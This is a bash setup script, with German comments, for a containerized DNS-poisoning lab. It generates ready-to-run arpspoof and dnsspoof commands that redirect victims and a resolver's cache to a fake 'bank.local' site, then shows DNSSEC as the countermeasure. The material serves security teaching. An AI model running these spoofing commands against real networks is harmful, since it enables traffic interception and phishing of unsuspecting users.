#!/usr/bin/env bash
# =============================================================================
#  setup.sh  –  Lab 05  DNS Poisoning
#  Erstellt das externe /24-Netz, startet alle Container, ruestet den
#  Angreifer aus und generiert .attack-cmds mit den korrekten IPs.
# =============================================================================
set -euo pipefail

NET=lab05-net
SUBNET=10.50.0.0/24
GW=10.50.0.1

echo "==> (1/5) Externes Netzwerk $NET ($SUBNET)"
docker network inspect "$NET" >/dev/null 2>&1 || \
  docker network create --subnet "$SUBNET" --gateway "$GW" "$NET"

echo "==> (2/5) Starte Container"
docker compose up -d

echo "==> (3/5) Rueste Angreifer aus (dsniff: arpspoof + dnsspoof) – kann ~1 Min dauern"
docker exec lab05-attacker bash -c \
  "apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
   dsniff iproute2 tcpdump dnsutils net-tools >/dev/null 2>&1" || \
  echo "   ! Hinweis: Tool-Installation pruefen (Internetzugang im Container?)"

echo "==> (3b/5) Rueste Opfer aus (curl + dig)"
for V in lab05-victim lab05-victim2; do
  docker exec "$V" bash -c \
    "apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
     curl dnsutils >/dev/null 2>&1" || \
    echo "   ! Hinweis: curl/dig in $V pruefen (Internetzugang im Container?)"
done

echo "==> (4/5) Warte auf DNSSEC-Signatur der Zone bank.local (auth-dns)"
for _ in $(seq 1 40); do
  docker exec lab05-auth-dns sh -c 'test -s /shared/bank.local.ksk' 2>/dev/null && break
  sleep 1
done

ip_of(){ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$1" 2>/dev/null; }
VICTIM=$(ip_of lab05-victim)
VICTIM2=$(ip_of lab05-victim2)
RESOLVER=$(ip_of lab05-resolver)
AUTH=$(ip_of lab05-auth-dns)
FAKE=$(ip_of lab05-web-fake)
REAL=$(ip_of lab05-web-real)

echo "==> (5/5) Schreibe .attack-cmds"
cat > .attack-cmds <<EOF
# =============================================================================
#  Lab 05  –  Angriffsbefehle (automatisch mit echten IPs gefuellt)
# =============================================================================
#  victim   = $VICTIM        victim2 = $VICTIM2
#  resolver = $RESOLVER      auth-dns = $AUTH
#  web-real = $REAL      web-fake = $FAKE
# -----------------------------------------------------------------------------

## SZENARIO A  –  Angriff direkt am Client (nur victim betroffen)
# Drei Terminals auf dem Host:
docker exec -it lab05-attacker arpspoof -i eth0 -t $VICTIM $RESOLVER
docker exec -it lab05-attacker arpspoof -i eth0 -t $RESOLVER $VICTIM
docker exec -it lab05-attacker dnsspoof -i eth0 -f /attacker/dnsspoof-hosts
# Test:
docker exec lab05-victim getent hosts bank.local      # -> $FAKE  (statt $REAL)

## SZENARIO B  –  Angriff am Resolver (Cache, ALLE Clients betroffen)
docker exec lab05-resolver unbound-control flush_zone bank.local.
docker exec -it lab05-attacker arpspoof -i eth0 -t $RESOLVER $AUTH
docker exec -it lab05-attacker arpspoof -i eth0 -t $AUTH $RESOLVER
docker exec -it lab05-attacker dnsspoof -i eth0 -f /attacker/dnsspoof-hosts
docker exec lab05-victim  getent hosts bank.local     # fuellt den Cache
docker exec lab05-resolver unbound-control dump_cache | grep bank.local
# Jetzt Angriff stoppen (Strg+C) und Opfer 2 testen -> trotzdem vergiftet:
docker exec lab05-victim2 getent hosts bank.local     # -> $FAKE

## SZENARIO C  –  Gegenmassnahme DNSSEC
docker exec lab05-resolver /scripts/enable-dnssec.sh
# Szenario B erneut -> Resolver verwirft die Faelschung:
docker exec lab05-victim dig @$RESOLVER bank.local +dnssec   # -> SERVFAIL
# Bonus DoT:
docker exec lab05-resolver /scripts/enable-dot.sh
# Zuruecksetzen:
docker exec lab05-resolver /scripts/disable-dnssec.sh
EOF

echo
echo "============================================================"
echo " Lab 05 bereit."
echo "   victim=$VICTIM  victim2=$VICTIM2  resolver=$RESOLVER"
echo "   auth-dns=$AUTH  web-real=$REAL  web-fake=$FAKE"
echo " Angriffsbefehle mit echten IPs:  cat .attack-cmds"
echo "============================================================"